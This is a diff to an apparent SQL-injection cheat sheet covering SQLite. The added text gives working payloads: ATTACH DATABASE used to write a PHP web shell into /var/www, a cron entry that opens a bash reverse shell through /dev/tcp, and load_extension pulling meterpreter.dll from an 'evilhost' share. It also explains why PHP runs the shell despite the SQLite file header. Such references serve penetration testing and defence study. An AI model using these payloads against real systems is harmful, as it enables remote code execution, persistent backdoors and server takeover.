@@ -84,18 +84,56 @@ AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 
 ### Attach Database
 
+This snippet shows how an attacker could abuse SQLite's `ATTACH DATABASE` feature to plant a web-shell on a server:
+
 ```sql
-ATTACH DATABASE '/var/www/lol.php' AS lol;
-CREATE TABLE lol.pwn (dataz text);
-INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
+ATTACH DATABASE '/var/www/shell.php' AS shell;
+CREATE TABLE shell.pwn (dataz text);
+INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
 ```
+
+First, it tells SQLite to "treat" a PHP file as a writable SQLite database. Then it creates a table inside that file (which is actually the future web-shell). Finally it writes malicious PHP code into the file.
+
+**Note:** Using `ATTACH DATABASE` to create a file comes with a drawback: SQLite will prepend its magic header bytes (`5351 4c69 7465 2066 6f72 6d61 7420 3300`, i.e., *"SQLite format 3"*). These bytes will corrupt most server-side scripts, but PHP is unusually tolerant: as long as a `<?php` tag appears anywhere in the file, the interpreter ignores any preceding garbage and executes the embedded code.
+
+```ps1
+file shell.php  
+shell.php: SQLite 3.x database, last written using SQLite version 3051000, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
+```
+
+If uploading a PHP web shell isn’t possible but the service runs with root privileges, an attacker can use the same technique to create a cron job that triggers a reverse shell:
+
+```sql
+ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
+CREATE TABLE cron.tab (dataz text);
+INSERT INTO cron.tab (dataz) VALUES (char(10) || '* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1' || char(10));--
+```
+
+This writes a new cron entry that runs every minute and connects back to the attacker.
 
 ### Load_extension
 
-:warning: This component is disabled by default.
+:warning: SQLite's ability to load external shared libraries (extensions) is disabled by default in most environments. When enabled, SQLite can load a compiled module using the `load_extension()` SQL function:
 
 ```sql
-UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
+SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
+```
+
+In the sqlite3 command-line shell you can display runtime configuration with:
+
+```sql
+sqlite> .dbconfig
+    load_extension on
+```
+
+If you see `load_extension on` (or off), that indicates whether the shell's runtime currently permits loading shared-library extensions.
+
+A SQLite extension is simply a native shared library,typically a `.so` file on Linux or a `.dll` file on Windows, that exposes a special initialization function. When the extension is loaded, SQLite calls this function to register any new SQL functions, virtual tables, or other features provided by the module.
+
+To compile a loadable extension on Linux, you can use:
+
+```ps1
+gcc -g -fPIC -shared demo.c -o demo.so
 ```
 
 ## SQLite File Manipulation
